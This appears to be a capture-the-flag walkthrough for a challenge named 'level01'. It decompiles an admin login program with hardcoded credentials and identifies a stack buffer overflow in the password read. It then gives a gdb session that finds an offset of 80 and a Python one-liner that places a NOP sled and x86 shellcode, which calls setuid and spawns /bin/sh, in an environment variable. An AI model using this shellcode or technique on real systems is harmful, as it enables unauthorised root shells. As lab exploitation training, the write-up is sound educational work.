# Walkthrough

## Reversing

```c
int verify_user_name(void)
{
    puts("verifying username....\n");
    return strncmp(&a_user_name, "dat_wil", 7);
}

int verify_user_pass(char *pass)
{
    return strncmp(pass, "admin", 5);
}

int main(void)
{
    int ret;
    char *it;
    char buff[64];

    it = buff;
    for (ret = 16; ret != 0; ret = ret + -1) {
        *it = '\0';
        it = it + 1;
    }
    puts("********* ADMIN LOGIN PROMPT *********");
    printf("Enter Username: ");
    fgets(&a_user_name,256,stdin);
    ret = verify_user_name();
    if (ret == 0) {
        puts("Enter Password: ");
        fgets(buff,100,stdin);
        ret = verify_user_pass((byte *)buff);
        if ((ret == 0) || (ret != 0)) {
            puts("nope, incorrect password...\n");
            ret = 1;
        }
        else {
            ret = 0;
        }
    }
    else {
        puts("nope, incorrect username...\n");
        ret = 1;
    }
    return ret;
}
```

The first `fgets` can overflow, but it will overflow the global variable
`a_user_name`, so let's just pass it entering a good username, and overflow
the next `fgets`, that reads `100` bytes into a local buffer of size `64`.

## Explotation

Open `gdb`, send a pattern and get the return address offset:
```bash
gdb -q ./level01

(gdb) r

# When prompetd about the user
dat_wil

# When prompetd about the password send the pattern
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x37634136 in ?? ()
```

Let's calculate the offset, remember the machine is little endian so
`0x37634136` would be: `6Ac7`. That's an offset of `80`.

Our payload will be:
- `80` offset bytes.
- Shellcode address.

Let's export our shellcode in the env, with a `NOP` Sled, and get the address
with the program in `../resources/getenv.c`:
```bash
export SC=$(python -c "print '\x90'*100+'\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80'")

gcc getenv.c -o getenv
./getenv SC
# SC address: 0xXXXXXXXX
```

And that's all, forge the payload manually or just launch
`./resources/exploit.py`, and let it handle all.

*Yes, I switched to python, even though the machine has python2...*
